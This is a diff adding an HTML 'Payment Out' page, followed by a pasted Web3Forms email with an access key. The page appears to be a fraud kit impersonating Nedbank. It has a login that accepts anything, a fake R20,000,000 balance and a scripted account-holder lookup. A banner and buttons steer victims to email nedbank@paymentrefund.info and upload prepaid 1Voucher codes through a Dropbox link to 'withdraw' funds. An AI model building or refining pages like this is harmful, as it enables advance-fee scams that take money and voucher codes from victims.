@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Payment Out</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&amp;display=swap" rel="stylesheet" />
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: 'Roboto', sans-serif;
+      background-color: #00724c;
+      color: #fff;
+    }
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 1rem;
+    }
+    .login-container, .dashboard-container {
+      display: none;
+      background: #fff;
+      color: #333;
+      padding: 2rem;
+      border-radius: 12px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+      max-width: 600px;
+      width: 100%;
+    }
+    h2, h3 {
+      text-align: center;
+      color: #00724c;
+    }
+    label { display: block; margin-top: 1rem; margin-bottom: 0.5rem; }
+    input, select, textarea {
+      width: 100%; padding: 0.6rem; border: 1px solid #ccc; border-radius: 6px;
+    }
+    button {
+      background-color: #00724c;
+      color: white;
+      border: none;
+      padding: 0.8rem 1.5rem;
+      width: 100%;
+      margin-top: 1rem;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .small-link {
+      display: block;
+      text-align: right;
+      margin-top: 0.5rem;
+      font-size: 0.85rem;
+      color: #00724c;
+      text-decoration: none;
+    }
+    .note-banner {
+      background: #fffae6;
+      color: #856404;
+      padding: 0.75rem 1rem;
+      border: 1px solid #ffeeba;
+      border-radius: 8px;
+      margin-bottom: 1.5rem;
+      font-size: 0.95rem;
+      animation: pulse 4s infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.6; }
+    }
+    .chat-box-toggle {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background-color: #00724c;
+      color: white;
+      border: none;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      font-size: 1.5rem;
+      cursor: pointer;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+    }
+    .chat-box {
+      display: none;
+      position: fixed;
+      bottom: 90px;
+      right: 20px;
+      width: 300px;
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+      padding: 1rem;
+      color: #333;
+      z-index: 1000;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="login-container" id="loginContainer">
+      <h2>Payment Out Login</h2>
+      <label for="username">Username or Email</label>
+      <input type="text" id="username" />
+      <label for="password">Password</label>
+      <input type="password" id="password" />
+      <label><input type="checkbox" /> Remember Me</label>
+      <a href="#" class="small-link">Forgot Password?</a>
+      <button onclick="loginUser()">Login</button>
+    </div>
+
+    <div class="dashboard-container" id="dashboardContainer">
+      <h2>Payment Out Dashboard</h2>
+      <div class="note-banner">
+        📢 Please contact <strong>Live Chat</strong> or email <a href="mailto:nedbank@paymentrefund.info">nedbank@paymentrefund.info</a> before uploading 1Voucher to confirm the correct amount needed for withdrawal.
+      </div>
+
+      <div style="text-align:center;font-size:1.4rem;margin:1rem 0;">
+        Account Balance:<br /><strong style="color:#00724c;">R20,000,000.00</strong>
+      </div>
+
+      <h3>Withdraw via Voucher</h3>
+      <label>Select 1Voucher Amount</label>
+      <select>
+        <option>R200</option><option>R500</option><option>R1000</option>
+        <option>R2000</option><option>R5000</option><option>R10000</option>
+      </select>
+      <label>Upload Voucher</label>
+      <input type="file" id="voucher" />
+      <button onclick="uploadVoucher()">Upload</button>
+
+      <h3>Transfer to SA Bank</h3>
+      <label>Bank</label>
+      <select id="bank">
+        <option value="nedbank">Nedbank</option>
+        <option value="fnb">FNB</option>
+        <option value="absa">ABSA</option>
+        <option value="standard">Standard Bank</option>
+        <option value="capitec">Capitec</option>
+        <option value="tyme">Tyme Bank</option>
+      </select>
+      <label>Account Number</label>
+      <input type="text" id="account" onblur="fetchAccountName()" />
+      <label>Account Holder</label>
+      <input type="text" id="accountName" disabled />
+      <button onclick="alert('Transfer initiated.')">Transfer</button>
+
+      <h3>Transaction History</h3>
+      <div class="transactions">
+        <p>+ R10,000.00 - Voucher Upload</p>
+        <p>+ R5,000.00 - Transfer to Capitec</p>
+      </div>
+
+      <div class="contact-support">
+        <p>Need help? Email: <a href="mailto:nedbank@paymentrefund.info">nedbank@paymentrefund.info</a></p>
+      </div>
+    </div>
+  </div>
+
+  <button class="chat-box-toggle" onclick="toggleChatBox()">💬</button>
+  <div class="chat-box" id="chatBox">
+    <form action="https://api.yourdomain.com/contact" method="POST">
+      <label>Your Name</label>
+      <input type="text" name="name" required />
+      <label>Your Email</label>
+      <input type="email" name="email" required />
+      <label>Your ZIP Code</label>
+      <input type="text" name="zip" required />
+      <label>Message</label>
+      <textarea name="message" rows="4" required></textarea>
+      <button type="submit">Send</button>
+    </form>
+  </div>
+
+  <!-- Tawk Integration -->
+  <script>
+    var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
+    (function () {
+      var s1 = document.createElement("script"), s0 = document.getElementsByTagName("script")[0];
+      s1.async = true;
+      s1.src = 'https://embed.tawk.to/your-tawk-property-id/default';
+      s1.charset = 'UTF-8';
+      s1.setAttribute('crossorigin', '*');
+      s0.parentNode.insertBefore(s1, s0);
+    })();
+  </script>
+
+  <script>
+    const loginContainer = document.getElementById("loginContainer");
+    const dashboardContainer = document.getElementById("dashboardContainer");
+
+    window.onload = () => {
+      loginContainer.style.display = "block";
+    };
+
+    function loginUser() {
+      loginContainer.style.display = "none";
+      dashboardContainer.style.display = "block";
+    }
+
+    function uploadVoucher() {
+      const fileInput = document.getElementById("voucher");
+      if (fileInput.files.length > 0) {
+        window.open("https://www.dropbox.com/request/ueIm8cOJ9qOe1BZfADpA", "_blank");
+      } else {
+        alert("Please select a file to upload.");
+      }
+    }
+
+    function fetchAccountName() {
+      const account = document.getElementById("account").value;
+      const accountName = document.getElementById("accountName");
+      if (account.length >= 6) {
+        setTimeout(() => (accountName.value = "John M. Doe"), 700);
+      } else {
+        accountName.value = "";
+      }
+    }
+
+    function toggleChatBox() {
+      const box = document.getElementById("chatBox");
+      box.style.display = box.style.display === "block" ? "none" : "block";
+    }
+  </script>
+</body>
+</html>
+
+
+On Thu, Jul 17, 2025, 12:41 PM Web3Forms <notify@web3forms.com> wrote:
+Web3Forms
+ 
+Hello, 
+
+Thank you for using Web3Forms. 
+
+Your Public Access Key is: 
+
+442e76e7-1296-4d5d-a7a7-0da951e6edb9 
+
+Note: The above access key is a public key (not API Key), which means you can use this code directly in the website source code. No need to hide it. See FAQ for guides on how to protect unauthorized usage of your form. 
+
+Next Steps
+Create an HTML Form. See Examples
+Add Access Key to your form. See Instructions
+Start receiving email submissions directly in your inbox
+Need help? Read our docs or Contact Support 
+
+Not sure how to get started? Please forward this to your web developer.
+Please ignore this email if you did not request a key. Need help? Contact Support.
+Powered by Web3Forms.
+ 
